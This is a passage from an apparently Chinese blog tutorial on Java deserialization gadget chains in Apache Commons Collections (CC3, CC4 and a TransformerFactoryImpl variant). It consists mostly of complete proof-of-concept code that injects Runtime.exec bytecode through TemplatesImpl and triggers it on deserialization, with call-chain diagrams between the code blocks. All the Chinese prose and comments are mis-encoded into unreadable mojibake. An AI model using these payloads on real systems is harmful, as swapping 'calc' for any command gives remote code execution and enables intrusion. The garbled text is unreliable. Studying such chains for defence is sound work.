<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Documented;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test3</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field f = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        f.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ChainedTransformer <span class="title">getTransformerChain</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] tfs = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> InstantiateTransformer(<span class="keyword">new</span> Class[]&#123;Templates.class&#125;, <span class="keyword">new</span> Object[]&#123;getTemplatesImpl(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;).waitFor();&quot;</span>)&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ChainedTransformer(tfs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> TemplatesImpl <span class="title">getTemplatesImpl</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">        CtClass[] cs = <span class="keyword">new</span> CtClass[]&#123;</span><br><span class="line">                pool.makeClass(<span class="string">&quot;a&quot;</span> + System.nanoTime()),</span><br><span class="line">                pool.makeClass(<span class="string">&quot;b&quot;</span> + System.nanoTime())</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        cs[<span class="number">0</span>].makeClassInitializer().insertBefore(cmd);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[][] bc = <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;</span><br><span class="line">                cs[<span class="number">0</span>].toBytecode(),</span><br><span class="line">                cs[<span class="number">1</span>].toBytecode()</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å®ä¾‹åŒ–templateså¹¶é€šè¿‡åå°„èµ‹å€¼</span></span><br><span class="line">        TemplatesImpl templates = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line"></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, bc);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;dqv5&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_transletIndex&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Class aih = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor aihC = aih.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        aihC.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ç”Ÿæˆæœ‰å…³Transformerçš„payload</span></span><br><span class="line">        Map map = LazyMap.decorate(<span class="keyword">new</span> HashMap(), getTransformerChain());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ç¬¬ä¸€ä¸ªAnnotationInvocationHandlerä½œä¸ºä»£ç†</span></span><br><span class="line">        InvocationHandler aihC1 = (InvocationHandler) aihC.newInstance(Documented.class, map);</span><br><span class="line">        Map proxy = (Map) Proxy.newProxyInstance(aih.getClassLoader(), <span class="keyword">new</span> Class[]&#123;Map.class&#125;, aihC1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ç¬¬äºŒä¸ªAnnotationInvocationHandlerä½œä¸ºè½½ä½“</span></span><br><span class="line">        Object aihC2 = aihC.newInstance(Documented.class, proxy);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ååºåˆ—åŒ–æµ‹è¯•</span></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(aihC2);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æ‰§è¡Œç»“æœğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202151109997.png" alt="image-20220215110939809"></p>
<p>æ˜¯æˆåŠŸäº†ã€‚</p>
<h3 id="CC4"><a href="#CC4" class="headerlink" title="- CC4 -"></a>- CC4 -</h3><p>å®éªŒç¯å¢ƒï¼š</p>
<ul>
<li><code>jdk1.7.0_02</code></li>
<li><code>Commons Collections 4.0</code></li>
</ul>
<h4 id="è°ƒç”¨ç»“æ„-3"><a href="#è°ƒç”¨ç»“æ„-3" class="headerlink" title="- è°ƒç”¨ç»“æ„ -"></a>- è°ƒç”¨ç»“æ„ -</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">PriorityQueue.readObject()</span><br><span class="line">	ğŸ‘‡</span><br><span class="line">	PriorityQueue.heapify()</span><br><span class="line">	ğŸ‘‡</span><br><span class="line">	PriorityQueue.siftDown()</span><br><span class="line">    ğŸ‘‡</span><br><span class="line">    PriorityQueue.siftDownUsingComparator()</span><br><span class="line">		ğŸ‘‡</span><br><span class="line">		TransformingComparator.compare()</span><br><span class="line">			ğŸ‘‡</span><br><span class="line">            ChainedTransformer.transform()</span><br><span class="line">			ğŸ‘‡</span><br><span class="line">			ConstantTransformer.transform() =&gt; InstantiateTransformer</span><br><span class="line">        	ğŸ‘‡</span><br><span class="line">        	InstantiateTransformer.transform() =&gt; TrAXFilter.TrAXFilter()</span><br><span class="line">            ğŸ‘‡</span><br><span class="line">        	TrAXFilter.TrAXFilter()</span><br><span class="line">        	ğŸ‘‡</span><br><span class="line">			TemplatesImpl.newTransformer()</span><br><span class="line">            ğŸ‘‡</span><br><span class="line">            TemplatesImpl.getTransletInstance()</span><br><span class="line">            ğŸ‘‡</span><br><span class="line">            TemplatesImpl.defineTransletClasses()</span><br><span class="line">            ğŸ‘‡</span><br><span class="line">            newInstance()</span><br><span class="line">            </span><br></pre></td></tr></table></figure>
<h4 id="åˆ†æ-5"><a href="#åˆ†æ-5" class="headerlink" title="- åˆ†æ -"></a>- åˆ†æ -</h4><p>æ€ä¹ˆè¯´å‘¢ï¼Œå°±æ˜¯å°† <code>CC2</code> å‰åŠæ®µå’Œ <code>CC3</code> ä¸­æ®µåŠ èµ·æ¥ï¼Œå†æ¥ä¸Š <code>TemplatesImpl</code> çš„ <code>payload</code> ã€‚</p>
<h4 id="payload-5"><a href="#payload-5" class="headerlink" title="- payload -"></a>- payload -</h4><p>æ‹¼æ¥ä¸€ä¸‹å°±å¥½äº†ğŸ‘‡</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test4</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field f = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        f.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ChainedTransformer <span class="title">getTransformerChain</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] tfs = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> InstantiateTransformer(<span class="keyword">new</span> Class[]&#123;Templates.class&#125;, <span class="keyword">new</span> Object[]&#123;getTemplatesImpl(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;).waitFor();&quot;</span>)&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ChainedTransformer(tfs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> TemplatesImpl <span class="title">getTemplatesImpl</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">        CtClass[] cs = <span class="keyword">new</span> CtClass[]&#123;</span><br><span class="line">                pool.makeClass(<span class="string">&quot;a&quot;</span> + System.nanoTime()),</span><br><span class="line">                pool.makeClass(<span class="string">&quot;b&quot;</span> + System.nanoTime())</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        cs[<span class="number">0</span>].makeClassInitializer().insertBefore(cmd);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[][] bc = <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;</span><br><span class="line">                cs[<span class="number">0</span>].toBytecode(),</span><br><span class="line">                cs[<span class="number">1</span>].toBytecode()</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å®ä¾‹åŒ–templateså¹¶é€šè¿‡åå°„èµ‹å€¼</span></span><br><span class="line">        TemplatesImpl templates = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line"></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, bc);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;dqv5&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_transletIndex&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ„é€ TransformingComparator</span></span><br><span class="line">        InvokerTransformer itf = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> Class[]&#123;&#125;, <span class="keyword">new</span> Object[]&#123;&#125;);</span><br><span class="line">        TransformingComparator tc = <span class="keyword">new</span> TransformingComparator(getTransformerChain());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ„é€ PriorityQueue</span></span><br><span class="line">        PriorityQueue pq = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>, tc);</span><br><span class="line"></span><br><span class="line">        setFieldValue(pq, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        setFieldValue(pq, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> Object[]&#123;getTemplatesImpl(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;).waitFor();&quot;</span>), <span class="keyword">null</span>&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// ååºåˆ—åŒ–æµ‹è¯•</span></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(pq);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æ‰§è¡Œç»“æœğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202151145397.png" alt="image-20220215114530193"></p>
<p>æ˜¯æˆåŠŸäº†ã€‚</p>
<h4 id="æ‰©å±•-1"><a href="#æ‰©å±•-1" class="headerlink" title="- æ‰©å±• -"></a>- æ‰©å±• -</h4><p>æç€æ’åˆ—ç»„åˆå‘¢ï¼Œå†æ¥æ’ä¸ªé“¾å§ã€‚</p>
<p>æ¯”å¦‚ <code>TransformerFactoryImpl</code> ç±»çš„ <code>newTransformerHandler</code> æ–¹æ³•ğŸ‘‡</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test4</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field f = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        f.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ChainedTransformer <span class="title">getTransformerChain</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] tfs = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(TransformerFactoryImpl.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;newInstance&quot;</span>,<span class="keyword">null</span>,<span class="keyword">null</span>),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;newTransformerHandler&quot;</span>,<span class="keyword">new</span> Class[]&#123;Templates.class&#125;,<span class="keyword">new</span> Object[]&#123;getTemplatesImpl(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;).waitFor();&quot;</span>)&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ChainedTransformer(tfs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> TemplatesImpl <span class="title">getTemplatesImpl</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">        CtClass[] cs = <span class="keyword">new</span> CtClass[]&#123;</span><br><span class="line">                pool.makeClass(<span class="string">&quot;a&quot;</span> + System.nanoTime()),</span><br><span class="line">                pool.makeClass(<span class="string">&quot;b&quot;</span> + System.nanoTime())</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        cs[<span class="number">0</span>].makeClassInitializer().insertBefore(cmd);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[][] bc = <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;</span><br><span class="line">                cs[<span class="number">0</span>].toBytecode(),</span><br><span class="line">                cs[<span class="number">1</span>].toBytecode()</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å®ä¾‹åŒ–templateså¹¶é€šè¿‡åå°„èµ‹å€¼</span></span><br><span class="line">        TemplatesImpl templates = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line"></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, bc);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;dqv5&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_transletIndex&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ„é€ TransformingComparator</span></span><br><span class="line">        InvokerTransformer itf = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> Class[]&#123;&#125;, <span class="keyword">new</span> Object[]&#123;&#125;);</span><br><span class="line">        TransformingComparator tc = <span class="keyword">new</span> TransformingComparator(getTransformerChain());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ„é€ PriorityQueue</span></span><br><span class="line">        PriorityQueue pq = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>, tc);</span><br><span class="line"></span><br><span class="line">        setFieldValue(pq, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        setFieldValue(pq, <span 